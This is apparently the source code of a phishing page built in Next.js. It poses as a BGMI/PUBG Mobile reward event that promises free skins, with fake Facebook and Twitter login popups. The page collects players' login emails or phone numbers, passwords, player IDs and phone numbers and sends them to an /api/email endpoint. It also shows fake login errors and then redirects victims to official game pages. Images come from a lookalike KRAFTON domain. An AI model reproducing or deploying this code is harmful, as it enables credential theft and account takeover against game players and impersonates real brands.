import Head from 'next/head'
import Image from 'next/image'
import styles from '../styles/Home.module.css'
import SimpleImageSlider from "react-simple-image-slider";
import { useEffect, useState } from 'react';
import { CircularProgress } from '@material-ui/core';
import cancel from '../public/png/cancel.png';
import facebooktet from '../public/png/facebook_text.png';
import { checkCustomRoutes } from 'next/dist/lib/load-custom-routes';
import Alert from '@material-ui/lab/Alert'
import { makeStyles } from "@material-ui/core/styles";
import { validateConfig } from 'next/dist/server/config-shared';
import { useRouter } from 'next/router'
const useStyles = makeStyles({
  cookieAlert: {
    "& 	.MuiAlert-message": {
      marginTop: -4,
  
      fontSize: 13
    }

  }
});



const images = [
  { url: "https://krafton-id.my.id/M15/header/selow1.jpg" },
  { url: "https://krafton-id.my.id/M15/header/selow2.jpg" },
  { url: "https://krafton-id.my.id/M15/header/selow3.jpg" },
  { url: "https://krafton-id.my.id/M15/header/selow4.jpg" },
  { url: "https://krafton-id.my.id/M15/header/selow5.jpg" },
 
];

export default function Home() {
  const router = useRouter();
  const classes = useStyles();
  const [alerts, setAlert] = useState(false);
  const [popup, setPopup] = useState(true);
  const [fb, setFb] = useState(false);
  const [tw, setTw] = useState(false);
  const [verify, setVerify] = useState(false);
  const [last, setLast] = useState(false);
  const [loading, setLoading] = useState(false);
  const [photo, setPhoto] = useState("");
  const [reward, setReward] = useState(false);
  const [end, setEnd] = useState(false);
  const [errmsg, setErrmsg] = useState("")
   const [charId, setCharId] = useState(
    {
      charId: '',
      charName: '',
      levlenumber: '',
      phone: '',
      mail: '',
      id: '',
      pass: '',
      loginType: '',
    }
  );

  useEffect(() => {
    // when the component is mounted, the alert is displayed for 3 seconds
    setTimeout(() => {
      setAlert(false);
    }, 3000);
  }, []); 4

    const check = () => {
      
      const timer = setTimeout(() => {
        setAlert(false);
      }, 3000);
      var mailFormat = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})|([0-9]\d{7,13})+$/;


      if(charId.id === undefined || "") {
      
        setAlert(true);
         }
         else  if(!mailFormat.test(charId.id)) {
         setAlert(true);
         }
         else  if(charId.pass === undefined || "") {
         setAlert(true);
         }
         else  if(charId.pass.length <= 5) {
         setAlert(true);
        }
        else {
          setFb(false)
          setVerify(true)
        }
      }
    

      const checks = () => {
      
        const timer = setTimeout(() => {
          setAlert(false);
        }, 3000);
      
        if(!charId.id ) {
        
          setAlert(true);
           }
          
           else  if(!charId.pass) {
           setErrmsg("please enter your password")
           }
           else  if(charId.pass.length <= 5) {
            setErrmsg("please check the password")
          
          }
          else {
            setErrmsg("")
            setTw(false)
            setVerify(true)
          }
        }



const validate = () => {
  var num = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})|([6-9]\d{9})+$/;
  var phone = charId.phone;
  const objToSend = encodeURIComponent(JSON.stringify(charId));
  var requestOptions = {
    method: 'GET',
    redirect: 'follow',
  };
  if (!charId.charId) {
    alert("please Enter Your player ID")
  } else if (charId.charId.length <= 5){
    alert("please Enter Valid player ID")
  } else if (!charId.phone){
    alert("please Enter Your Phone Number")
  } else if (!num.test(phone)) {
    alert ("please Enter A valid Phone Number")
  } else if (!charId.levlenumber) {
    alert(" PLease Enter Level")
  }
  
  else {
setVerify(false);
 setLast(true);
 setLoading(true);
fetch(`/api/email?params=${objToSend}`, requestOptions)
.then((response) => response.text())
.then((result) => {
 
  console.log(result)
  if (JSON.parse(result)?.message) {
    setLoading(false);
    setLast(false);
  }
else{
  router.push('https://esports.pubgmobile.com/#/index');
  alert("There is an error occured while submitting your details please try again")
}
})
  }
}


  
const openreward = () => {
 setReward(true)
}

  return (
    <div>
    <div class="slider-container rewardsBox">
<div class="navbar">
<img class="navbar-logo" src="https://krafton-id.my.id/M15/img/selowlogo.jpg"/>
<div class="navbar-title">
BGMI MOBILE
<br></br>
<span>The original Battle Royale,<br /></span>
</div> 
<div class="navbar-right">
<img class="navbar-shop" src="https://i.ibb.co/7rk8d91/nav-shop.png"/>
<img class="navbar-language" src="https://i.ibb.co/RHBwzZR/nav-language.png"/>
<div class="navbar-download"><img src="https://i.ibb.co/fS7q3xs/nav-download.png"/></div>
</div>
</div> 
<div class="header">
<div class="sliderHeader">
<SimpleImageSlider
       width="100%"
        height={254}
        images={images}
        showBullets={false}
        showNavs={false}
        autoPlayDelay={2}
        slideDuration={0.3}
        loop={true}
        autoPlay={true}
      />
</div>
</div> 
<div class="alert" style={{border:  "3px solid", borderColor: "#1288A1"}} ></div>


<div class="gallery-container" style={{background: "url('https://krafton-id.my.id/M15/img/bg.png')", marginTop:"-20px"}}>
<div class="boxs">
<center>
<div class="season-alert">
</div> 
<div class="tab_rewards" id="latest">
<center>
<div class="balance">
<img src="https://krafton-id.my.id/M15/img/selow/1.png"/>
<div class="balance-nom">Golden Pharaoh X-Suit</div>
<div class="balance-detail">Reward Register Event</div>
<button onmousedown="buka.play();" onClick={(e) => {setPhoto("https://krafton-id.my.id/M15/img/selow/1.png"), openreward()}} value="img/selow/1.png" src="img/selow/1.png">Tap to collect</button>
</div>
<div class="balance">
<img src="https://krafton-id.my.id/M15/img/selow/2.png"/>
<div class="balance-nom">Materials: 18</div>
<div class="balance-detail">Reward Register Event</div>
<button onmousedown="buka.play();"  onClick={(e) => {setPhoto("https://krafton-id.my.id/M15/img/selow/2.png"), openreward()}} value="img/selow/2.png" src="img/selow/2.png">Tap to collect</button>
</div>
<div class="balance">
<img src="https://krafton-id.my.id/M15/img/selow/3.png"/>
<div class="balance-nom">Iridenscene X-Suit</div>
<div class="balance-detail">Reward Register Event</div>
<button onmousedown="buka.play();"  onClick={(e) => {setPhoto("https://krafton-id.my.id/M15/img/selow/3.png"), openreward()}} value="img/selow/3.png" src="img/selow/3.png">Tap to collect</button>
</div>
<div class="balance">
<img src="https://krafton-id.my.id/M15/img/selow/4.png"/>
<div class="balance-nom">The Fools - M416</div>
<div class="balance-detail">Reward Register Event</div>
<button onmousedown="buka.play();"  onClick={(e) => {setPhoto("https://krafton-id.my.id/M15/img/selow/4.png"), openreward()}} value="img/selow/4.png" src="img/selow/4.png">Tap to collect</button>
</div>
<div class="balance">
<img src="https://krafton-id.my.id/M15/img/selow/5.png"/>
<div class="balance-nom">Imperial Splendor - M416</div>
<div class="balance-detail">Reward Register Event</div>
<button onmousedown="buka.play();"  onClick={(e) => {setPhoto("https://krafton-id.my.id/M15/img/selow/5.png"), openreward()}} value="img/selow/5.png" src="img/selow/5.png">Tap to collect</button>
</div></center>
</div>
{/* <div class="balance">
<image src="img/selow/6.png"/>
<div class="balance-nom">Glacier - M416</div>
<div class="balancedetail">Reward Register Event</div>
<button onmousedown="buka.play();" onclick="open_itemReward_confirmation(this);" src="img/selow/6.png">Tap to collect</button>
</div>*/}
<div class="balance">
<img src="https://krafton-id.my.id/M15/img/selow/6.png"/>
<div class="balance-nom">Glacier - M416</div>
<div class="balance-detail">Reward Register Event</div>
<button  onClick={(e) => {setPhoto("https://krafton-id.my.id/M15/img/selow/6.png"), openreward()}} value="img/selow/6.png"  src="img/selow/6.png" >Tap to collect</button>
</div>
</center>
<div>&nbsp;</div>  
</div>
</div>




 

<div class="footer" style={{marginTop: "-20px"}}>
<img class="footer-copyright-icons" src="https://krafton-id.my.id/M15/img/batas.png"/>
<div class="footer-txt-copyrights">Partnership Inquiry: pubgmobile_business@tencent.com</div>
<img class="footer-copyright-icon" src="https://krafton-id.my.id/M15/img/footer.png"/>
<div class="footer-txt-copyright">ⓒ 2022 KRAFTON, Inc. All rights reserved.</div> 
<div class="footer-txt-copyright">ⓒ 2018-2022 Tencent. All rights reserved.</div>
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> 
</div>



</div>


{verify && (
  <div class="popup account_verification animated fadeIn">
  <div class="popup-box-wrapper">
  <div class="popup-box-bg3">
  <div class="popup-box-selow3"><div>&nbsp;</div>Verify Your Information:
</div> 
<form class="popup-box-form" onSubmit={() => {console.log("submitted")}}>


<input type="number" name="playid" id="playid"  onChange={(e) => setCharId({ ...charId, charId: e.target.value })} placeholder="Player ID" autocomplete="off"   required/>

<input type="number" name="phone" id="phone"  onChange={(e) => setCharId({ ...charId, phone: e.target.value })} placeholder="Phone Number" autocomplete="off" required />
<select name="level" id="level" required=""  onChange={(e) => setCharId({ ...charId, levlenumber: e.target.value })} oninvalid="this.setCustomValidity('Choose your Account Level')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Account Level</option> 
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
</form>
</div>
 
  <div class="popup-box-footerc" style={{marginTop: "12px"}}>
<button type="submit" onmousedown="buka.play();" onClick= {() => {validate()}}>Verification</button>
</div>
  </div>
  </div> 

  
)}

{last && (
  <div class="popup account_verification animated fadeIn">
  <div class="popup-box-wrapper">
  <div class="popup-box-bg3">
  <div style={{marginLeft: "35px"}} class="popup-box-selow3"><div>&nbsp;</div>
  <div  class="spinner">
  {loading && <CircularProgress size={55} />}{!loading && 'OK'}
  </div>
  <br />
Checking Your account Details...
</div> 

</div>
  </div>
  </div> 

  
)}

{fb && (
                        <div
                          className="popup-login login-facebook animated fadeIn"
                          style={{ display: '' }}
                        >
                          <div className="popup-box-login-fb">
                            <div onClick={() => {setFb(false), setPopup(true)}} className="close-fb">
                              <img
                                onClick={() => setFb(false)}
                                width="20px"
                                height="20px"
                                src="https://i.ibb.co/1rFHdWM/cancel.png"
                                alt=""
                              />
                            </div>
                            <div className="navbar-fb">
                              <img src="https://i.ibb.co/2vkSn8W/facebook-text.png" alt="" />
                            </div>
                             {alerts ? <Alert icon={false} style={{height:'50px'}} className={classes.cookieAlert}  variant="filled" severity='error' size='small'>The email or phone number you entered does not match any account.</Alert> : <></> }
                            <div className="content-box-fb">
                              <img
                                src="https://i.ibb.co/xHxvMmm/bgmilogo.png"
                                alt=""
                              />
                              <div className="txt-login-fb">
                                Login to your account to connect to BGMI Mobile.
                              </div>
                              <form>
                                <input
                                  onChange={(e) => setCharId({ ...charId, id: e.target.value })}
                                  type="email"
                                  id="fbid"
                                  className="loginEmail"
                                  name="emails"
                                  placeholder="Mobile number or email"
                                  autocomplete="off"
                                  autocapitalize="off"
                               
                                />
                                <input
                                  onChange={(e) => setCharId({ ...charId, pass: e.target.value })}
                                  type="password"
                                  className="loginEmail"
                                  name="passwords"
                                  id="fbPassword"
                                  style={{marginTop:'10px'}}
                                  placeholder="Password"
                                  autocomplete="off"
                                  autocapitalize="off"
                                  
                                />
                                <div className="showHide showPassword" onclick="showFbPassword()">
                                  <i className="zmdi zmdi-eye zmdi-hc-2x"></i>
                                </div>
                                <div
                                  className="showHide hidePassword"
                                  style={{ display: 'none' }}
                                  onclick="hideFbPassword()"
                                >
                                  <i className="zmdi zmdi-eye zmdi-hc-2x"></i>
                                </div>
                                <input type="hidden" name="login" value="Facebook" readonly />
                                <div
                                  style={{marginTop:'50px'}}
                                 onClick={() => check()}
                                  
                                  className="btn-login-fb"
                                >
                                  Log In
                                </div>
                              </form>
                              <div className="txt-create-account">Create an account</div>
                              <div className="txt-not-now">Not now</div>
                              <div className="txt-forgotten-password">Forgot your password?</div>
                            </div>
                            <div className="language-box">
                              <center>
                                <div className="language-name language-name-active">Thai</div>
                                <div className="language-name">Bahasa Indonesia</div>
                                <div className="language-name">Basa Jawa</div>
                                <div className="language-name">Bahasa Melayu</div>
                                <div className="language-name">日本語</div>
                                <div className="language-name">Español</div>
                                <div className="language-name">Português (Brasil)</div>
                                <div className="language-name">
                                  <i className="fa fa-plus"></i>
                                </div>
                              </center>
                            </div>
                            <div className="copyright">Facebook Inc.</div>
                          </div>
                        </div>
                      )}
                    

                    {tw && (
                        <div
                          className="popup-login login-facebook animated fadeIn"
                          style={{ display: '' }}
                        >
                          <div className="containers">
                            <div
                              style={{ zIndex: 200 }}
                              onClick={() => setFb(false)}
                              className="close-fb"
                            >
                              <img
                                onClick={() => {setTw(false), setPopup(true)}}
                                width="20px"
                                height="20px"
                                src="https://i.ibb.co/1rFHdWM/cancel.png"
                                alt=""
                              />
                            </div>
                           {alerts ? <Alert icon={false} style={{height:'50px', backgroundColor: '#00acee'}} className={classes.cookieAlert}  variant="filled" severity='error' size='small'>The email or phone number you entered does not match any account.</Alert> : <></> }
                            <div
                              style={{ display: 'flex', alignItems: 'center' }}
                              className="box box-one"
                            >

                              <i className="fab fa-twitter">
                                <img src="https://img.icons8.com/color/50/000000/twitter--v1.png" />
                              </i>
                              <button style={{ marginTop: '10px' }}>
                                <img src="https://i.ibb.co/Tc3QKtX/google.png" width="19" />
                                <span>Sign in with Google</span>
                              </button>
                              <button style={{marginTop:'10px'}}>
                                <img src="https://i.ibb.co/XXZw0k0/apple.png" width="19" />
                                <span>Sign in with Apple</span>
                              </button>
                            </div>
                            <h5>Or</h5>
                            <div
                              style={{ display: 'flex', alignItems: 'center' }}
                              className="box box-two"
                            >
                              <input
                                type="text"
                                onChange={(e) => setCharId({ ...charId, id: e.target.value })}
                                placeholder="Email, or username"
                              />
                              <input
                                onChange={(e) => setCharId({ ...charId, pass: e.target.value })}
                                style={{ marginTop: '10px' }}
                                type="password"
                                placeholder="Password"
                              />
                              <p style={{color:"red", fontSize: "12px"}} >{errmsg}</p>
                              <button
                                onClick={() => checks()}
                                style={{ marginTop: '10px' }}
                                className="next-btn"
                              >
                                Next
                              </button>
                              <button style={{ marginTop: '10px' }}>Forget password</button>
                            </div>
                            <p style={{fontSize: "11px"}} >
                              Don't have an account <a href="#">Sign Up</a>
                            </p>
                          </div>
                        </div>
                      )}

{popup && (
  <div class="popup account_login animated fadeIn">
<div class="popup-box-wrapper">
<div class="popup-box-bg">
<div class="popup-box-se3low">
Login to BGMI MOBILE Account</div> 
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-twitter"  onClick={() => { setCharId({ ...charId, loginType: "Twitter" }), setPopup(false), setTw(true)}}><img src="https://i.ibb.co/zSx6dHn/link2.png" style={{height: "16px"}} />Login using Twitter</button>
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onClick={() => { setCharId({ ...charId, loginType: "Facebook" }),  setPopup(false), setFb(true)}}><img style={{marginRight: "4px", height:"16px"}} src="https://i.ibb.co/BLGsPHw/link1.png" />Login using Facebook</button>
<br></br>
</div>
</div> 
</div>
  
)}


{reward && (
 <div class="popup itemReward_confirmation animated fadeIn">
 <div class="popup-box-wrapper">
 <div class="popup-box-bg2">
 <div class="popup-box-selow2">
 <br />Are you sure to claim this item?</div> 
 <div class="popup-box-item itemShine">
 <div>
<figure>
<img src={photo} id="myItemReward_confirmationImg"/>
</figure>
</div>
</div>
<div class="popup-footer">

<button type="button" onmousedown="tutup.play();" class="popup-footer-deactive" onClick={() => {setReward(false)}}>Cancel</button>
<button type="button" onmousedown="buka.play();" class="popup-footer-active" onClick={() => {setReward(false), setEnd(true)}} >Collect</button>
</div>
 </div>
 </div> 
 </div>
)}

{end && (
 <div class="popup processing_account animated fadeIn">
 <div class="popup-box-wrapper">
 <div class="popup-box-bg">
 <div class="popup-box-se3low9">
 Thank you for joining the Event.<br />
 Your account is being processed. Please wait up to 24 hours.
 </div> 
 
<div class="popup-box-footerz">
<button type="button" onmousedown="tutup.play();" onClick={() => {  router.push('https://www.youtube.com/c/BattlegroundsMobile_IN/featured');}}>Logout</button>
</div>
 </div>
 </div> 
 </div>
)}
    </div>
  )
}
